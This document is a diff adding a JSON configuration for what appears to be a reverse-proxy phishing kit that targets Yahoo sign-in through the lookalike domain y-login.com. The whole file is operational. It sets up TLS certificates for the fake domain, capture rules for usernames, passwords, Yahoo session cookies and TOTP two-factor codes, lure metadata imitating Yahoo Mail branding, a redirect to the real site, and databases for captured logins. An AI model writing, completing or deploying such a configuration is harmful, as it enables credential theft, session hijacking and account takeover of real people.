@@ -1,0 +1,45 @@
+{
+  "service_name": "yahoo",
+  "target_domain": "login.yahoo.com",
+  "phishing_domain": "y-login.com",
+  "port": 443,
+  "ssl": {
+    "enabled": true,
+    "auto_generate": false,
+    "lets_encrypt": true,
+    "cert_path": "/etc/letsencrypt/live/y-login.com/fullchain.pem",
+    "key_path": "/etc/letsencrypt/live/y-login.com/privkey.pem"
+  },
+  "redirect_url": "https://mail.yahoo.com",
+  "capture_rules": {
+    "credentials": [
+      {"field": "username", "selector": "username"},
+      {"field": "password", "selector": "password"}
+    ],
+    "cookies": ["A1", "A3", "B"],
+    "2fa_token": "input[name='totp']"
+  },
+  "lure": {
+    "og_title": "Yahoo Mail - Sign In",
+    "og_description": "Access your Yahoo Mail securely.",
+    "og_image": "https://y-login.com/yahoo_logo.png",
+    "favicon": "https://y-login.com/favicon.ico"
+  },
+  "logging": {
+    "level": "DEBUG",
+    "file": "yahoo_phish.log"
+  },
+  "storage": {
+    "database": "yahoo_captures.db",
+    "encrypt": true,
+    "ttl_hours": 24
+  },
+  "analytics": {
+    "enabled": true,
+    "database": "yahoo_analytics.db"
+  },
+  "link_format": {
+    "use_email_fragment": true,
+    "prefill_email": true
+  }
+}
